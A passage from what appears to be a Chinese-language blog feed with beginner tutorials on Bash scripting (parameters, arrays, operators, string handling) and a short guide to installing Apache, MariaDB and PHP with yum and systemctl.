class="hljs-string">&quot;Shell 传递参数实例！&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个参数为：<span class="hljs-variable">$1</span>&quot;</span>;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;参数个数为：<span class="hljs-variable">$#</span>&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;传递的参数作为一个字符串显示：$*&quot;</span>;<br></code></pre></div></td></tr></table></figure><p>执行脚本，输出结果如下所示：</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">$ chmod +x <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span> <br>$ ./<span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span> 1 2 3<br><span class="hljs-keyword">Shell</span> 传递参数实例！<br>第一个参数为：1<br>参数个数为：3<br>传递的参数作为一个字符串显示：1 2 3<br></code></pre></div></td></tr></table></figure><p>$* 与 $@ 区别：</p><ul><li>相同点：都是引用所有参数。</li><li>不同点：只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，，则 “ * “ 等价于 “1 2 3”（传递了一个参数），而 “@” 等价于 “1” “2” “3”（传递了三个参数）。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>echo &quot;-- \$* 演示 ---&quot;<br>for i in &quot;$*&quot;; do<br>    echo $i<br>done<br><br>echo &quot;-- \$@ 演示 ---&quot;<br>for i in &quot;$@&quot;; do<br>    echo $i<br>done<br></code></pre></div></td></tr></table></figure><p>执行脚本，输出结果如下所示：</p><figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck"><span class="hljs-comment">$</span> <span class="hljs-comment">chmod</span> <span class="hljs-literal">+</span><span class="hljs-comment">x</span> <span class="hljs-comment">test</span><span class="hljs-string">.</span><span class="hljs-comment">sh</span> <br><span class="hljs-comment">$</span> <span class="hljs-string">.</span><span class="hljs-comment">/test</span><span class="hljs-string">.</span><span class="hljs-comment">sh</span> <span class="hljs-comment">1</span> <span class="hljs-comment">2</span> <span class="hljs-comment">3</span><br>-- <span class="hljs-comment">$*</span> <span class="hljs-comment">演示</span> --<span class="hljs-literal">-</span><br><span class="hljs-comment">1</span> <span class="hljs-comment">2</span> <span class="hljs-comment">3</span><br>-- <span class="hljs-comment">$@</span> <span class="hljs-comment">演示</span> --<span class="hljs-literal">-</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">2</span><br><span class="hljs-comment">3</span><br></code></pre></div></td></tr></table></figure><h2 id="Shell-数组"><a href="#Shell-数组" class="headerlink" title="Shell 数组"></a>Shell 数组</h2><p>数组中可以存放多个值。Bash Shell 只支持一维数组（不支持多维数组），初始化时不需要定义数组大小（与 PHP 类似）。</p><p>与大部分编程语言类似，数组元素的下标由 0 开始。</p><p>Shell 数组用括号来表示，元素用”空格”符号分割开，语法格式如下：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">array_name</span>=(value<span class="hljs-number">1</span> value<span class="hljs-number">2</span> ... valuen)<br></code></pre></div></td></tr></table></figure><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>my_array=(A B &quot;C&quot; D)<br></code></pre></div></td></tr></table></figure><p>我们也可以使用下标来定义数组:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">array_name[0]=value0<br>array_name[1]=value1<br>array_name[2]=value2<br></code></pre></div></td></tr></table></figure><h3 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h3><p>读取数组元素值的一般格式是：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">&#123;array_name[index]&#125;</span><br></code></pre></div></td></tr></table></figure><h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>my_array=(A B &quot;C&quot; D)<br><br>echo &quot;第一个元素为: $&#123;my_array[0]&#125;&quot;<br>echo &quot;第二个元素为: $&#123;my_array[1]&#125;&quot;<br>echo &quot;第三个元素为: $&#123;my_array[2]&#125;&quot;<br>echo &quot;第四个元素为: $&#123;my_array[3]&#125;&quot;<br></code></pre></div></td></tr></table></figure><p>执行脚本，输出结果如下所示：</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">$ chmod +x test.sh <br>$ ./test.sh<br><span class="hljs-section">第一个元素为: A</span><br><span class="hljs-section">第二个元素为: B</span><br><span class="hljs-section">第三个元素为: C</span><br><span class="hljs-section">第四个元素为: D</span><br></code></pre></div></td></tr></table></figure><h3 id="获取数组中的所有元素"><a href="#获取数组中的所有元素" class="headerlink" title="获取数组中的所有元素"></a>获取数组中的所有元素</h3><p>使用@ 或 * 可以获取数组中的所有元素，例如：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>my_array[0]=A<br>my_array[1]=B<br>my_array[2]=C<br>my_array[3]=D<br><br>echo &quot;数组的元素为: $&#123;my_array[*]&#125;&quot;<br>echo &quot;数组的元素为: $&#123;my_array[@]&#125;&quot;<br></code></pre></div></td></tr></table></figure><p>执行脚本，输出结果如下所示：</p><figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">$</span> <span class="hljs-variable">chmod</span> <span class="hljs-operator">+</span><span class="hljs-variable">x</span> <span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">sh</span> <br><span class="hljs-variable">$</span> <span class="hljs-operator">./</span><span class="hljs-variable">test</span><span class="hljs-operator">.</span><span class="hljs-variable">sh</span><br>数组的元素为<span class="hljs-operator">:</span> <span class="hljs-variable">A</span> <span class="hljs-variable">B</span> <span class="hljs-built_in">C</span> <span class="hljs-built_in">D</span><br>数组的元素为<span class="hljs-operator">:</span> <span class="hljs-variable">A</span> <span class="hljs-variable">B</span> <span class="hljs-built_in">C</span> <span class="hljs-built_in">D</span><br></code></pre></div></td></tr></table></figure><h3 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h3><p>获取数组长度的方法与获取字符串长度的方法相同，例如：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>my_array[0]=A<br>my_array[1]=B<br>my_array[2]=C<br>my_array[3]=D<br><br>echo &quot;数组元素个数为: $&#123;#my_array[*]&#125;&quot;<br>echo &quot;数组元素个数为: $&#123;#my_array[@]&#125;&quot;<br></code></pre></div></td></tr></table></figure><p>执行脚本，输出结果如下所示：</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">$ chmod +x <span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span> <br>$ ./<span class="hljs-keyword">test</span>.<span class="hljs-keyword">sh</span><br>数组元素个数为: 4<br>数组元素个数为: 4<br></code></pre></div></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>val=`expr 2 + 2`<br>echo &quot;两数之和为 : $val&quot;<br></code></pre></div></td></tr></table></figure><p>两点注意：</p><ul><li><p>表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2，这与我们熟悉的大多数编程语言不一样。</p></li><li><p>完整的表达式要被 ` 包含，注意这个字符不是常用的单引号，在 Esc 键下边。</p></li></ul><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：</p><table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>+</td><td>加法</td><td><code>expr $a + $b</code> 结果为 30。</td></tr><tr><td>-</td><td>减法</td><td><code>expr $a - $b</code> 结果为 -10。</td></tr><tr><td>*</td><td>乘法</td><td><code>expr $a \* $b</code> 结果为  200。</td></tr><tr><td>/</td><td>除法</td><td><code>expr $b / $a</code> 结果为 2。</td></tr><tr><td>%</td><td>取余</td><td><code>expr $b % $a</code> 结果为 0。</td></tr><tr><td>=</td><td>赋值</td><td>a=$b 将把变量 b 的值赋给 a。</td></tr><tr><td>==</td><td>相等。用于比较两个数字，相同则返回 true。</td><td>[ $a == $b ] 返回 false。</td></tr><tr><td>!=</td><td>不相等。用于比较两个数字，不相同则返回 true。</td><td>[ $a != $b ] 返回 true。</td></tr></tbody></table><p><strong>注意：</strong>条件表达式要放在方括号之间，并且要有空格，例如: <strong>[$a==$b]</strong> 是错误的，必须写成 **[ $a == $b ]**。</p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>关系运算符只支持数字，不支持字符串，除非字符串的值是数字。</p><p>下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：</p><table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>-eq</td><td>检测两个数是否相等，相等返回 true。</td><td>[ $a -eq $b ] 返回 false。</td></tr><tr><td>-ne</td><td>检测两个数是否不相等，不相等返回 true。</td><td>[ $a -ne $b ] 返回 true。</td></tr><tr><td>-gt</td><td>检测左边的数是否大于右边的，如果是，则返回 true。</td><td>[ $a -gt $b ] 返回 false。</td></tr><tr><td>-lt</td><td>检测左边的数是否小于右边的，如果是，则返回 true。</td><td>[ $a -lt $b ] 返回 true。</td></tr><tr><td>-ge</td><td>检测左边的数是否大于等于右边的，如果是，则返回 true。</td><td>[ $a -ge $b ] 返回 false。</td></tr><tr><td>-le</td><td>检测左边的数是否小于等于右边的，如果是，则返回 true。</td><td>[ $a -le $b ] 返回 true。</td></tr></tbody></table><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20:</p><table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑的 AND</td><td>[[ $a -lt 100 &amp;&amp; $b -gt 100 ]] 返回 false</td></tr><tr><td>||</td><td>逻辑的 OR</td><td>[[ $a -lt 100 || $b -gt 100 ]] 返回 true</td></tr></tbody></table><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><p>下表列出了常用的字符串运算符，假定变量 a 为 “abc”，变量 b 为 “efg”：</p><table><thead><tr><th>运算符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>=</td><td>检测两个字符串是否相等，相等返回 true。</td><td>[ $a = $b ] 返回 false。</td></tr><tr><td>!=</td><td>检测两个字符串是否不相等，不相等返回 true。</td><td>[ $a != $b ] 返回 true。</td></tr><tr><td>-z</td><td>检测字符串长度是否为0，为0返回 true。</td><td>[ -z $a ] 返回 false。</td></tr><tr><td>-n</td><td>检测字符串长度是否不为 0，不为 0 返回 true。</td><td>[ -n “$a” ] 返回 true。</td></tr><tr><td>$</td><td>检测字符串是否为空，不为空返回 true。</td><td>[ $a ] 返回 true。</td></tr></tbody></table><h3 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h3><p>文件测试运算符用于检测 Unix 文件的各种属性。</p><p>属性检测描述如下：</p><table><thead><tr><th>操作符</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>-b file</td><td>检测文件是否是块设备文件，如果是，则返回 true。</td><td>[ -b $file ] 返回 false。</td></tr><tr><td>-c file</td><td>检测文件是否是字符设备文件，如果是，则返回 true。</td><td>[ -c $file ] 返回 false。</td></tr><tr><td>-d file</td><td>检测文件是否是目录，如果是，则返回 true。</td><td>[ -d $file ] 返回 false。</td></tr><tr><td>-f file</td><td>检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td><td>[ -f $file ] 返回 true。</td></tr><tr><td>-g file</td><td>检测文件是否设置了 SGID 位，如果是，则返回 true。</td><td>[ -g $file ] 返回 false。</td></tr><tr><td>-k file</td><td>检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td><td>[ -k $file ] 返回 false。</td></tr><tr><td>-p file</td><td>检测文件是否是有名管道，如果是，则返回 true。</td><td>[ -p $file ] 返回 false。</td></tr><tr><td>-u file</td><td>检测文件是否设置了 SUID 位，如果是，则返回 true。</td><td>[ -u $file ] 返回 false。</td></tr><tr><td>-r file</td><td>检测文件是否可读，如果是，则返回 true。</td><td>[ -r $file ] 返回 true。</td></tr><tr><td>-w file</td><td>检测文件是否可写，如果是，则返回 true。</td><td>[ -w $file ] 返回 true。</td></tr><tr><td>-x file</td><td>检测文件是否可执行，如果是，则返回 true。</td><td>[ -x $file ] 返回 true。</td></tr><tr><td>-s file</td><td>检测文件是否为空（文件大小是否大于0），不为空返回 true。</td><td>[ -s $file ] 返回 true。</td></tr><tr><td>-e file</td><td>检测文件（包括目录）是否存在，如果是，则返回 true。</td><td>[ -e $file ] 返回 true。</td></tr></tbody></table><p>其他检查符：</p><ul><li><strong>-S</strong>: 判断某文件是否 socket。</li><li><strong>-L</strong>: 检测文件是否存在并且是一个符号链接。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Shell Shell Base</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell base -1</title>
    <link href="/2021/05/03/Shell/ShellBase/shell%20base%20-1/"/>
    <url>/2021/05/03/Shell/ShellBase/shell%20base%20-1/</url>
    
    <content type="html"><![CDATA[<h2 id="运行前的准备"><a href="#运行前的准备" class="headerlink" title="运行前的准备"></a>运行前的准备</h2><p>准备命令</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux">mkdir lx<br>cd lx<br>touch lx.sh<br>vim lx.sh<br># 增加编译权限<br>chmod +x lx.sh<br>./lx.sh<br></code></pre></div></td></tr></table></figure><h2 id="输出及变量"><a href="#输出及变量" class="headerlink" title="输出及变量"></a>输出及变量</h2><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>count=1;<br><span class="hljs-meta">#</span><span class="bash"> 变量赋值</span><br>name=&quot;lwx&quot;;<br><span class="hljs-meta">#</span><span class="bash"> 两种变量输出方式</span><br>echo $&#123;count&#125;&quot;:Hello World!&quot;;<br>echo &quot;Hello $&#123;name&#125;!&quot;;<br><span class="hljs-meta">#</span><span class="bash"> 设置只读变量</span><br>readonly name;<br><span class="hljs-meta">#</span><span class="bash"> 删除变量</span><br>unset count;<br>echo $&#123;count&#125;;<br>name=&quot;lwx1&quot;;<br><br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>：</p><ol><li>单引号的缺点：<ol><li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；</li><li>单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</li></ol></li><li>双引号的优点：<ol><li>双引号里可以有变量</li><li>双引号里可以出现转义字符</li></ol></li></ol><p>拼接输出</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">your_name=&quot;runoob&quot;<br><span class="hljs-meta">#</span><span class="bash"> 使用双引号拼接</span><br>greeting=&quot;hello, &quot;$your_name&quot; !&quot;<br>greeting_1=&quot;hello, $&#123;your_name&#125; !&quot;<br>echo $greeting  $greeting_1<br><span class="hljs-meta">#</span><span class="bash"> 使用单引号拼接</span><br>greeting_2=&#x27;hello, &#x27;$your_name&#x27; !&#x27;<br>greeting_3=&#x27;hello, $&#123;your_name&#125; !&#x27;<br>echo $greeting_2  $greeting_3<br></code></pre></div></td></tr></table></figure><p>结果如下：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">hello, runoob ! hello, runoob !<br>hello, runoob ! hello, $&#123;your_name&#125; !<br></code></pre></div></td></tr></table></figure><h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><h3 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">string=<span class="hljs-string">&quot;abcd&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;#string&#125;</span> <span class="hljs-comment">#输出 4</span><br></code></pre></div></td></tr></table></figure><h3 id="提取子字符串"><a href="#提取子字符串" class="headerlink" title="提取子字符串"></a>提取子字符串</h3><p>以下实例从字符串第 <strong>2</strong> 个字符开始截取 <strong>4</strong> 个字符：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span>=<span class="hljs-string">&quot;runoob is a great site&quot;</span><br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-keyword">string</span>:<span class="hljs-number">1</span>:<span class="hljs-number">4</span>&#125; <span class="hljs-comment"># 输出 unoo</span><br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>：第一个字符的索引值为 <strong>0</strong>。</p><h3 id="查找子字符串"><a href="#查找子字符串" class="headerlink" title="查找子字符串"></a>查找子字符串</h3><p>查找字符 <strong>i</strong> 或 <strong>o</strong> 的位置(哪个字母先出现就计算哪个)：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span>=<span class="hljs-string">&quot;runoob is a great site&quot;</span><br><span class="hljs-keyword">echo</span> `expr index <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>&quot;</span> io`  <span class="hljs-comment"># 输出 4</span><br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong> 以上脚本中 ` 是反引号，而不是单引号 ‘，不要看错了哦。</p><h2 id="Shell-数组"><a href="#Shell-数组" class="headerlink" title="Shell 数组"></a>Shell 数组</h2><p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p><p>类似于 C 语言，数组元素的下标由 0 开始编号。获取数组中的元素要利用下标，下标可以是整数或算术表达式，其值应大于或等于 0。</p><h3 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h3><p>在 Shell 中，用括号来表示数组，数组元素用”空格”符号分割开。定义数组的一般形式为：</p><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel">数组名=(值<span class="hljs-number">1</span> 值<span class="hljs-number">2</span> ... 值<span class="hljs-built_in">n</span>)<br></code></pre></div></td></tr></table></figure><p>例如：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">array_name</span>=(value<span class="hljs-number">0</span> value<span class="hljs-number">1</span> value<span class="hljs-number">2</span> value<span class="hljs-number">3</span>)<br></code></pre></div></td></tr></table></figure><p>或者</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-built_in">array</span>_name=(<br>value0<br>value1<br>value2<br>value3<br>)<br></code></pre></div></td></tr></table></figure><p>还可以单独定义数组的各个分量：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">array_name[0]=value0<br>array_name[1]=value1<br>array_name[n]=valuen<br></code></pre></div></td></tr></table></figure><p>可以不使用连续的下标，而且下标的范围没有限制。</p><h3 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h3><p>读取数组元素值的一般格式是：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;数组名[下标]&#125;</span><br></code></pre></div></td></tr></table></figure><p>例如：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">valuen=<span class="hljs-variable">$&#123;array_name[n]&#125;</span><br></code></pre></div></td></tr></table></figure><p>使用 @ 符号可以获取数组中的所有元素，例如：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;array_name[@]&#125;</span><br></code></pre></div></td></tr></table></figure><h3 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h3><p>获取数组长度的方法与获取字符串长度的方法相同，例如：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># 取得数组元素的个数</span><br>length=<span class="hljs-variable">$&#123;#array_name[@]&#125;</span><br><span class="hljs-comment"># 或者</span><br>length=<span class="hljs-variable">$&#123;#array_name[*]&#125;</span><br><span class="hljs-comment"># 取得数组单个元素的长度</span><br>lengthn=<span class="hljs-variable">$&#123;#array_name[n]&#125;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shell Shell Base</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LAMP</title>
    <link href="/2021/05/01/%E6%9D%82%E9%A1%B9/LAMP/"/>
    <url>/2021/05/01/%E6%9D%82%E9%A1%B9/LAMP/</url>
    
    <content type="html"><![CDATA[<h1 id="LAMP安装"><a href="#LAMP安装" class="headerlink" title="LAMP安装"></a>LAMP安装</h1><h2 id="apache安装"><a href="#apache安装" class="headerlink" title="apache安装"></a>apache安装</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">yum -y install httpd<br>systemctl <span class="hljs-keyword">enable</span> httpd<br>systemctl <span class="hljs-keyword">start</span> httpd<br></code></pre></div></td></tr></table></figure><h2 id="mariadb安装"><a href="#mariadb安装" class="headerlink" title="mariadb安装"></a>mariadb安装</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">yum -y install mariadb-<span class="hljs-keyword">server</span><br>systemctl <span class="hljs-keyword">enable</span> mariadb<br>systemctl <span class="hljs-keyword">start</span> mariadb<br></code></pre></div></td></tr></table></figure><h2 id="php安装"><a href="#php安装" class="headerlink" title="php安装"></a>php安装</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">yum</span> -y install php<br><span class="hljs-attribute">yum</span> search php-mysql<br><span class="hljs-attribute">yum</span> -y install php-mysqlnd.x<span class="hljs-number">86</span>_<span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><h2 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h2><figure class="highlight vala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vala"><br><span class="hljs-meta"># 开机启动</span><br>systemctl enable 